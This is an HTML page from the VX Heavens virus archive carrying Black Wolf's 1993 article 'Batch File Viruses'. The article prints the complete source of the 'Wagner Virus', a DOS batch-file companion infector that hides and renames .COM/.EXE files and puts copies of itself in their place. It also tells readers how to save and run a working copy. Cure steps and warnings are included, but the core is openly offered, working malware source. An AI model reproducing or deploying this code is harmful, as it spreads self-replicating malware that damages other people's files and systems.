<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<title> Black Wolf 'Batch File Viruses' (VX heavens)</title>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<meta name="Author" content="Black Wolf" />
	<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Black Wolf,Batch File Viruses, files, attrib, directory, exist, wagner, virus, code, file, batch, " />
	<meta name="Description" content="[...] They are incredibly simple to write and requir no real programming experience, and There are a growing number of programs that will convert .BAT files into .COM and/or .EXE files [...]" />
	<link rel="icon" href="/favicon.ico" type="image/x-icon" />
	<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
	<link rel="stylesheet" type="text/css" href="/style.css" /><link rel="canonical" href="http://vxheavens.com/lib/vbw01.html" />
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
	<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize" /></a></div>	<form id="lf"  style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set" /><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
	<div style="float: right;" class="addthis_toolbox addthis_default_style">
		<script type="text/javascript">var addthis_config = { ui_click: true }</script>
		<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
		<script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
	</div>
	<div style="float: right;">
		<script type="text/javascript" src="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>		
		<form action="/search.php" id="cse-search-box">
			<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo" />
			<input type="hidden" name="cof" value="FORID:10" />
			<input type="hidden" name="ie" value="UTF-8" />
			<input type="text" name="q" size="12" value=" " />
			<input type="submit" name="sa" value="Search" />
		</form>
	</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heavens</a></h1>
	<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all" />
</div>
<div class="ad_top">
<!-- Яндекс.Директ -->
<script type="text/javascript">
//<![CDATA[
yandex_partner_id = 66169;
yandex_site_bg_color = 'CCCBBB';
yandex_site_charset = 'utf-8';
yandex_ad_format = 'direct';
yandex_font_size = 1;
yandex_direct_type = 'horizontal';
yandex_direct_border_type = 'block';
yandex_direct_limit = 4;
yandex_direct_header_bg_color = 'EEEDDD';
yandex_direct_bg_color = 'DDDCCC';
yandex_direct_border_color = 'BBBAAA';
yandex_direct_title_color = '0000CC';
yandex_direct_url_color = '006600';
yandex_direct_all_color = '0000CC';
yandex_direct_text_color = '000000';
yandex_direct_hover_color = '0066FF';
yandex_direct_favicon = true;
document.write('<sc'+'ript type="text/javascript" src="http://an.yandex.ru/system/context.js"></sc'+'ript>');
//]]>
</script>
</div> 
<div class="s2"><h1>Batch File Viruses</h1><p><a href="/lib/?lang=en&amp;author=Black%20Wolf"> Black Wolf</a><br /></p>[<a style="" href="/lib/?lang=EN&amp;index=MA#vbw01">Back to index</a>] [<a href="/comment.php?uri=lib:vbw01">Comments</a> (0)]<br /><!-- This file was downloaded from http://vx.netlux.org/ -->           
      
<p>Batch File viruses are becoming increasingly common, because o two main reasons:</p>
<ol>
	<li>They are incredibly simple to write and requir no real programming experience, and</li>
	<li>There are a growing number of programs that will convert .BAT files into .COM and/or .EXE files.</li>
</ol>	
<p>This allows the batch file to pose as an executable and prevents it from being typed. The following virus, however, works in BAT format It searches the directory for .COM files and .EXE files, finding th last one in the directory. It then renames it to its name with a V at the beginning, hides it, and puts a batch file with the same nam into the directory that contains the virus. The commands used can be found in an MS-DOS User's Manual. To cure it, read the instructions within the virus itself simply by typing one of the infected .BAT files. This, despite the fact that it is not an 'executable' program, is a virus and, like all others, can cause damage if improperly handled. It will not go out of the directory, unless it is run from another directory. As with anything that is potentially dangerous, just be careful and use common sense. And if you do not understand it, DO NOT PRESS YOUR LUCK BY PLAYING WITH IT! Study the code and an MS-DOS manual until you do understand it. I am not including an in-depth study of this virus due to its simplicity. To create a working version of this virus, type the code in between the dotted lines into a program such as EDIT.COM that comes with DOS, and save it as WAGNER.BAT. Put it in an isolated directory, and then you can test it. Again, be careful, for it is YOUR responsibility for anything you do with it.</p>
<p>The Wagner Virus</p>
<pre class="source">
@echo off
ctty nul
rem ______________________________________________________________
rem :Wagner Virus, as presented in Virology 101 (c) 1993 Black Wolf
rem :This virus can be cured simply by typing "attrib -h -r *.*" in
rem :infected directories and deleting BAT files that are identical
rem :to this code, then rename the files having a "V" at the start
rem :to their original names. NOTE: Does not infect COMMAND.COM.
rem :______________________________________________________________
for %%f in (*.exe *.com) do set A=%%f
if %A%==COMMAND.COM set A=
rename %A% V%A%
if not exist V%A% goto end
attrib +h V%A%
copy %0.bat %A%
attrib +r %A%
ren %A% *.bat
set A=
:end
ctty con
@if exist V%0.com V%0.com %1 %2 %3
@if exist V%0.exe V%0.exe %1 %2 %3
</pre>
<script type="text/javascript"><!--
google_ad_client = "pub-2785179539054532";
google_ad_slot = "6188198145";
google_ad_width = 468;
google_ad_height = 15;
//-->
</script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script></div>
<!--INFOLINKS_OFF-->
<div style="margin-top: 2px; float: left;" class="adsapeu">
 <a style="color: #dbc8a0" href="/friends.php">friends</a>
</div>
<script type="text/javascript">var infolink_pid = 70507;</script><script type="text/javascript" src="http://resources.infolinks.com/js/infolinks_main.js"></script>
<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script><script type="text/javascript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vbw01">de</a><a href="/lib/index.php?lang=en&amp;id=vbw01">en</a><a href="/lib/index.php?lang=es&amp;id=vbw01">es</a><a href="/lib/index.php?lang=it&amp;id=vbw01">it</a><a href="/lib/index.php?lang=fr&amp;id=vbw01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vbw01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vbw01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vbw01">ua</a></div>
</body>
</html>
